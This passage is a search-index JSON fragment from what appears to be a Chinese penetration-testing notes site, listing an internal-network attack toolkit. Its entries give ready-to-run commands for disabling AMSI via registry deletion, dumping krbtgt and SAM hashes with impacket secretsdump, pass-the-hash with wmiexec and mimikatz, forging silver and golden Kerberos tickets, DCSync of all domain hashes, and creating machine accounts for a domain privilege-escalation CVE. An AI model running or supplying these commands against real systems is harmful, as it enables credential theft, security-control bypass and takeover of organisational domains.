\u67e5\u8be2\u67d0\u4e2a\u57df\u7528\u6237\u6b63\u5728\u767b\u5f55\u54ea\u53f0\u4e3b\u673a","title":"adfind"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#net-user","text":"net user xxx /domain \u53ef\u5141\u8bb8\u7684\u5de5\u4f5c\u7ad9\u91cc\u4fbf\u662f","title":"net user"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#cve","text":"","title":"\u5e38\u89c1cve\u626b\u63cf"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#advul","text":"https://github.com/Amulab/advul","title":"advul"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#_7","text":"","title":"\u59d4\u6d3e"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#_8","text":"\u626b\u63cf Get-NetUser -Domain de1ay.com|? {$_.useraccountcontrl -like \"*trusted_for_delegation*\"}","title":"\u975e\u7ea6\u675f\u6027\u59d4\u6d3e"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#_9","text":"\u626b\u63cf Get-NetUser -trustedtoauth -Domain shfe.com.cn","title":"\u7ea6\u675f\u6027\u59d4\u6d3e"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/%E5%86%85%E7%BD%91%E4%BE%A6%E6%9F%A5/#_10","text":"everything\uff0c\u53ef\u4ee5\u76f4\u63a5\u8d77\u4e00\u4e2ahttp\u7aef\u53e3\u7528\u6765\u67e5\u6587\u4ef6 https://www.freebuf.com/sectool/261723.html","title":"\u6587\u4ef6\u641c\u7d22"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/","text":"\u5185\u7f51\u5de5\u5177\u5305 \u76ee\u5f55 \u5173\u95edamsi \u8bbe\u7f6e\u53ef\u52a0\u8f7d\u811a\u672c \u67e5\u770b\u51fd\u6570\u5e2e\u52a9\u6587\u6863 \u5c06powershell\u7ed3\u679c\u8f93\u51fa\u4fdd\u5b58 impacket \u901a\u7528\u9009\u9879 secretsdump dumphash wmiexec pth ticketer \u91d1\u94f6\u7968\u636e\u4f2a\u9020 ticketConverter ccache\u4e0ekirbi\u4e92\u8f6c\u811a\u672c GetUserSPNs \u67e5\u8be2\u57df\u5185SPN smbserver \u642d\u5efasmb\u670d\u52a1\u5668 \u8fdc\u7a0b\u8bfb\u6ce8\u518c\u8868 empire mimikatz DCsync pth \u9ec4\u91d1\u7968\u636e powersploit powerview \u67e5\u770b\u57df\u4fe1\u4efb \u67e5\u770bacl Rubeus \u83b7\u53d6tgt \u6742 Powermad SharpRDP \u5173\u95edamsi Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse \u6062\u590d\u547d\u4ee4 New-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\" -Name \"{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -ErrorAction Ignore | Out-Null \u8bbe\u7f6e\u53ef\u52a0\u8f7d\u811a\u672c set-executionpolicy remotesigned \u67e5\u770b\u51fd\u6570\u5e2e\u52a9\u6587\u6863 function_name -? get-help function_name -examples get-help function_name -detailed \u5c06powershell\u7ed3\u679c\u8f93\u51fa\u4fdd\u5b58 \uff5cout-file -filepath c:/xx/x/xx impacket Python\u5199\u7684\u7684\u5185\u7f51\u5de5\u5177\u5305 \u6559\u7a0b https://xz.aliyun.com/t/11877 \u901a\u7528\u9009\u9879 hash\u8ba4\u8bc1 py -3 xxx.py domain/user@ip -hashes :161cff084477fe596a5db81874498a24 Kerberos\u8ba4\u8bc1 export KRB5CCNAME=ad01.ccache py -3 xxx.py -k -no-pass secretsdump dumphash \u57fa\u4e8eNTLM\u8ba4\u8bc1\uff0c\u4f7f\u7528\u673a\u5668\u7528\u6237\u5bfc\u51fa py -3 secretsdump.py -hashes 5f8506740ed68996ffd4e5cf80cb5174:5f8506740ed68996ffd4e5cf80cb5174 \"domain/DC$@DCIP\" -just-dc-user krbtgt \u57fa\u4e8eKerberos\u7968\u636e\u5bfc\u51fa export KRB5CCNAME=ad01.ccache py -3 [secretsdump.py](http://secretsdump.py) -k -no-pass [AD01.test.com](http://AD01.test.com) -dc-ip 192.168.111.146 -target-ip 192.168.111.146 -just-dc-user krbtgt \u672c\u5730\u89e3\u5bc6SAM py -3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL wmiexec pth \u6a2a\u5411\u811a\u672c python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 Administrator@10.10.10.10 ticketer \u91d1\u94f6\u7968\u636e\u4f2a\u9020 \u94f6\u7968 \u4f7f\u7528win-7\\$\u7684\u673a\u5668\u8d26\u6237\u7684hash96dd976cc094ca1ddb2f06476fb61eb6\u4f2a\u9020cifs/win-7\u7684\u670d\u52a1\u7968\u636e\uff0c\u4f7f\u7528\u7968\u636e\u7684\u7528\u6237\u662f\u6839\u672c\u4e0d\u5b58\u5728\u7684qqq\u6216\u8005\u5b58\u5728\u7684\u4efb\u610f\u7528\u6237\u3002 py -3 .\\ticketer.py -spn cifs/win-7 -domain-sid S-1-5-21-2799988422-2257142125-1453840996 -domain test.com -nthash 96dd976cc094ca1ddb2f06476fb61eb6 qqq \u91d1\u724c \u5728\u94f6\u7968\u7684\u547d\u4ee4\u57fa\u7840\u4e0a\u53bb\u6389-spn\uff0c\u5c06nthash\u4fee\u6539\u4e3akrbtgt\u7684hash\u5373\u53ef\u3002 py -3 .\\ ticketer.py -domain-sid S-1-5-21-2799988422-2257142125-1453840996 -domain test.com -nthash 96dd976cc094ca1ddb2f06476fb61eb6 qqq ticketConverter ccache\u4e0ekirbi\u4e92\u8f6c\u811a\u672c py -3 .\\ticketConverter.py .\\administrator.ccache .\\administrator.kirbi GetUserSPNs \u67e5\u8be2\u57df\u5185SPN \u53ef\u4f7f\u7528\u5bc6\u7801\u8ba4\u8bc1\u3001hash\u8ba4\u8bc1\u3001Kerberos\u8ba4\u8bc1 py -3 GetUserSPNs.py test.com/administrator:1qaz@WSX -target-domain test.com smbserver \u642d\u5efasmb\u670d\u52a1\u5668 python smbserver.py demo /opt/ \u8fdc\u7a0b\u62c9\u6587\u4ef6 copy samrdump.exe \\\\192.168.3.137\\demo \u8fdc\u7a0b\u8bfb\u6ce8\u518c\u8868 \u6709\u65f6\u5019\u62ff\u5230hash\u6216\u5bc6\u7801\u4e0d\u80fd\u76f4\u63a5pth\u4e0a\u53bb\uff0c\u53ef\u4ee5\u8bfb\u6ce8\u518c\u8868\u770b\u770b\u6709\u4ec0\u4e48\u53d1\u73b0 impacket-reg -hashes ':e53d87d42adaa3ca32bdb34a876cbffb' -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName HKU\\\\SOFTWARE -s > henry_reg.txt empire mimikatz \u4e0d\u89e3\u91ca DCsync # \u5bfc\u51fa\u57df\u5185\u6307\u5b9a\u7528\u6237\u7684\u4fe1\u606f(\u5305\u62ec\u54c8\u5e0c\u503c) lsadump::dcsync /domain:whoamianony.org /user:administrator lsadump::dcsync /domain:whoamianony.org /user:administrator /csv # \u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u7684\u4fe1\u606f(\u5305\u62ec\u54c8\u5e0c\u503c) lsadump::dcsync /domain:whoamianony.org /all lsadump::dcsync /domain:whoamianony.org /all /csv pth sekurlsa::pth /user:administrator /domain:\"xxx.com\" /ntlm:6542d35ed5ff6ae5e75b875068c5d3bc //\u81ea\u884c\u4fee\u6539 \u7136\u540e\u4f1a\u5f39\u51fa\u7ba1\u7406\u5458cmd shell \u8bd5\u8bd5\u8bfb\u57df\u63a7\u6587\u4ef6 net use \\\\192.168.222.131\\c$ \u9ec4\u91d1\u7968\u636e wmic useraccount get name,sid \u83b7\u53d6sid \u8fd9\u91cc\u5f97\u5230 administrator \u7684 SID \u4e3a S-1-5-21-284927032-1122706408-2778656994-500\uff0c\u5373\u8868\u793a\u5f53\u524d\u57df\u7684 SID \u5c31\u662f S-1-5-21-284927032-1122706408-2778656994\uff08\u7528\u7684\u65f6\u5019\u53bb\u6389\u6700\u540e\u7684\u2010500\uff0c500\u8868\u793a\u4e3aadministrator\u7528\u6237\uff09 mimikatz lsadump::dcsync /domain:hack.com /user:krbtgt \u5bfc\u51fakrbtgt hash mimikatz kerberos::purge \u6e05\u9664\u5df2\u6709\u7968\u636e kerberos::golden /admin:administrator /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /ticket:golden.kiribi \u751f\u6210\u9ec4\u91d1\u7968\u636e\uff0c\u5e76\u4fdd\u5b58\u5230golden.kiribi kerberos::ptt golden.kiribi \u5bfc\u5165\u9ec4\u91d1\u7968\u636e\u5230\u5185\u5b58 ls \\\\dc\\c$ \u5229\u7528 powersploit ps1\u7684\u5185\u7f51\u5de5\u5177\u5305 powerview \u4fe1\u606f\u641c\u96c6\u5de5\u5177 \u67e5\u770b\u57df\u4fe1\u4efb get-domaintrust -domain name \u67e5\u770bacl Get-ObjectAcl -samAccountName username -ResolveGUIDs Rubeus \u6ee5\u7528Kerberos\u7684\u5de5\u5177 \u83b7\u53d6tgt impacket\u4e5f\u53ef\u4ee5\u505a\u5230 Rubeus.exe asktgt /user:DC /password:******* /domain:attack.local /dc:attack.local /nowrap \u6742 Powermad \u7528\u4e8e\u4e0e\u673a\u5668\u8d26\u6237\u4ea4\u6d89\u3002\u5982CVE-2021-42287\\&CVE-2021-42278 \u57df\u5185\u63d0\u6743\uff0c\u53ef\u7528\u5b83\u6765\u521b\u5efa\u673a\u5668\u7528\u6237 Import-Module .\\Powermad.ps1;New-MachineAccount -MachineAccount hacksystem -Password $(ConvertTo-SecureString \"hack\" -AsPlainText -Force) SharpRDP \u4f7f\u7528rdp\u534f\u8bae\u8fdb\u884c\u6a2a\u5411\uff0c\u53ef\u4ee5\u7ed5\u8fc7smb\u4e0d\u53ef\u7528\u7b49\u60c5\u51b5 https://github.com/0xthirteen/SharpRDP","title":"\u5185\u7f51\u5de5\u5177\u5305"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#_1","text":"","title":"\u5185\u7f51\u5de5\u5177\u5305"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#_2","text":"\u5173\u95edamsi \u8bbe\u7f6e\u53ef\u52a0\u8f7d\u811a\u672c \u67e5\u770b\u51fd\u6570\u5e2e\u52a9\u6587\u6863 \u5c06powershell\u7ed3\u679c\u8f93\u51fa\u4fdd\u5b58 impacket \u901a\u7528\u9009\u9879 secretsdump dumphash wmiexec pth ticketer \u91d1\u94f6\u7968\u636e\u4f2a\u9020 ticketConverter ccache\u4e0ekirbi\u4e92\u8f6c\u811a\u672c GetUserSPNs \u67e5\u8be2\u57df\u5185SPN smbserver \u642d\u5efasmb\u670d\u52a1\u5668 \u8fdc\u7a0b\u8bfb\u6ce8\u518c\u8868 empire mimikatz DCsync pth \u9ec4\u91d1\u7968\u636e powersploit powerview \u67e5\u770b\u57df\u4fe1\u4efb \u67e5\u770bacl Rubeus \u83b7\u53d6tgt \u6742 Powermad SharpRDP","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#amsi","text":"Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse \u6062\u590d\u547d\u4ee4 New-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\" -Name \"{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -ErrorAction Ignore | Out-Null","title":"\u5173\u95edamsi"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#_3","text":"set-executionpolicy remotesigned","title":"\u8bbe\u7f6e\u53ef\u52a0\u8f7d\u811a\u672c"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#_4","text":"function_name -? get-help function_name -examples get-help function_name -detailed","title":"\u67e5\u770b\u51fd\u6570\u5e2e\u52a9\u6587\u6863"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#powershell","text":"\uff5cout-file -filepath c:/xx/x/xx","title":"\u5c06powershell\u7ed3\u679c\u8f93\u51fa\u4fdd\u5b58"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#impacket","text":"Python\u5199\u7684\u7684\u5185\u7f51\u5de5\u5177\u5305 \u6559\u7a0b https://xz.aliyun.com/t/11877","title":"impacket"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#_5","text":"hash\u8ba4\u8bc1 py -3 xxx.py domain/user@ip -hashes :161cff084477fe596a5db81874498a24 Kerberos\u8ba4\u8bc1 export KRB5CCNAME=ad01.ccache py -3 xxx.py -k -no-pass","title":"\u901a\u7528\u9009\u9879"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#secretsdump-dumphash","text":"\u57fa\u4e8eNTLM\u8ba4\u8bc1\uff0c\u4f7f\u7528\u673a\u5668\u7528\u6237\u5bfc\u51fa py -3 secretsdump.py -hashes 5f8506740ed68996ffd4e5cf80cb5174:5f8506740ed68996ffd4e5cf80cb5174 \"domain/DC$@DCIP\" -just-dc-user krbtgt \u57fa\u4e8eKerberos\u7968\u636e\u5bfc\u51fa export KRB5CCNAME=ad01.ccache py -3 [secretsdump.py](http://secretsdump.py) -k -no-pass [AD01.test.com](http://AD01.test.com) -dc-ip 192.168.111.146 -target-ip 192.168.111.146 -just-dc-user krbtgt \u672c\u5730\u89e3\u5bc6SAM py -3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL","title":"secretsdump dumphash"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#wmiexec-pth","text":"\u6a2a\u5411\u811a\u672c python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 Administrator@10.10.10.10","title":"wmiexec pth"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#ticketer","text":"\u94f6\u7968 \u4f7f\u7528win-7\\$\u7684\u673a\u5668\u8d26\u6237\u7684hash96dd976cc094ca1ddb2f06476fb61eb6\u4f2a\u9020cifs/win-7\u7684\u670d\u52a1\u7968\u636e\uff0c\u4f7f\u7528\u7968\u636e\u7684\u7528\u6237\u662f\u6839\u672c\u4e0d\u5b58\u5728\u7684qqq\u6216\u8005\u5b58\u5728\u7684\u4efb\u610f\u7528\u6237\u3002 py -3 .\\ticketer.py -spn cifs/win-7 -domain-sid S-1-5-21-2799988422-2257142125-1453840996 -domain test.com -nthash 96dd976cc094ca1ddb2f06476fb61eb6 qqq \u91d1\u724c \u5728\u94f6\u7968\u7684\u547d\u4ee4\u57fa\u7840\u4e0a\u53bb\u6389-spn\uff0c\u5c06nthash\u4fee\u6539\u4e3akrbtgt\u7684hash\u5373\u53ef\u3002 py -3 .\\ ticketer.py -domain-sid S-1-5-21-2799988422-2257142125-1453840996 -domain test.com -nthash 96dd976cc094ca1ddb2f06476fb61eb6 qqq","title":"ticketer \u91d1\u94f6\u7968\u636e\u4f2a\u9020"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#ticketconverter-ccachekirbi","text":"py -3 .\\ticketConverter.py .\\administrator.ccache .\\administrator.kirbi","title":"ticketConverter ccache\u4e0ekirbi\u4e92\u8f6c\u811a\u672c"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#getuserspns-spn","text":"\u53ef\u4f7f\u7528\u5bc6\u7801\u8ba4\u8bc1\u3001hash\u8ba4\u8bc1\u3001Kerberos\u8ba4\u8bc1 py -3 GetUserSPNs.py test.com/administrator:1qaz@WSX -target-domain test.com","title":"GetUserSPNs \u67e5\u8be2\u57df\u5185SPN"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#smbserver-smb","text":"python smbserver.py demo /opt/ \u8fdc\u7a0b\u62c9\u6587\u4ef6 copy samrdump.exe \\\\192.168.3.137\\demo","title":"smbserver \u642d\u5efasmb\u670d\u52a1\u5668"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#_6","text":"\u6709\u65f6\u5019\u62ff\u5230hash\u6216\u5bc6\u7801\u4e0d\u80fd\u76f4\u63a5pth\u4e0a\u53bb\uff0c\u53ef\u4ee5\u8bfb\u6ce8\u518c\u8868\u770b\u770b\u6709\u4ec0\u4e48\u53d1\u73b0 impacket-reg -hashes ':e53d87d42adaa3ca32bdb34a876cbffb' -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName HKU\\\\SOFTWARE -s > henry_reg.txt","title":"\u8fdc\u7a0b\u8bfb\u6ce8\u518c\u8868"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#empire","text":"","title":"empire"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#mimikatz","text":"\u4e0d\u89e3\u91ca","title":"mimikatz"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#dcsync","text":"# \u5bfc\u51fa\u57df\u5185\u6307\u5b9a\u7528\u6237\u7684\u4fe1\u606f(\u5305\u62ec\u54c8\u5e0c\u503c) lsadump::dcsync /domain:whoamianony.org /user:administrator lsadump::dcsync /domain:whoamianony.org /user:administrator /csv # \u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u7684\u4fe1\u606f(\u5305\u62ec\u54c8\u5e0c\u503c) lsadump::dcsync /domain:whoamianony.org /all lsadump::dcsync /domain:whoamianony.org /all /csv","title":"DCsync"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#pth","text":"sekurlsa::pth /user:administrator /domain:\"xxx.com\" /ntlm:6542d35ed5ff6ae5e75b875068c5d3bc //\u81ea\u884c\u4fee\u6539 \u7136\u540e\u4f1a\u5f39\u51fa\u7ba1\u7406\u5458cmd shell \u8bd5\u8bd5\u8bfb\u57df\u63a7\u6587\u4ef6 net use \\\\192.168.222.131\\c$","title":"pth"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#_7","text":"wmic useraccount get name,sid \u83b7\u53d6sid \u8fd9\u91cc\u5f97\u5230 administrator \u7684 SID \u4e3a S-1-5-21-284927032-1122706408-2778656994-500\uff0c\u5373\u8868\u793a\u5f53\u524d\u57df\u7684 SID \u5c31\u662f S-1-5-21-284927032-1122706408-2778656994\uff08\u7528\u7684\u65f6\u5019\u53bb\u6389\u6700\u540e\u7684\u2010500\uff0c500\u8868\u793a\u4e3aadministrator\u7528\u6237\uff09 mimikatz lsadump::dcsync /domain:hack.com /user:krbtgt \u5bfc\u51fakrbtgt hash mimikatz kerberos::purge \u6e05\u9664\u5df2\u6709\u7968\u636e kerberos::golden /admin:administrator /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /ticket:golden.kiribi \u751f\u6210\u9ec4\u91d1\u7968\u636e\uff0c\u5e76\u4fdd\u5b58\u5230golden.kiribi kerberos::ptt golden.kiribi \u5bfc\u5165\u9ec4\u91d1\u7968\u636e\u5230\u5185\u5b58 ls \\\\dc\\c$ \u5229\u7528","title":"\u9ec4\u91d1\u7968\u636e"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#powersploit","text":"ps1\u7684\u5185\u7f51\u5de5\u5177\u5305","title":"powersploit"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E5%B7%A5%E5%85%B7%E7%A7%AF%E7%B4%AF/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7%E5%8C%85/#powerview","text":"\u4fe1\u606f\u641c\u96c6\u5de5\u5177","title":"powerview"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7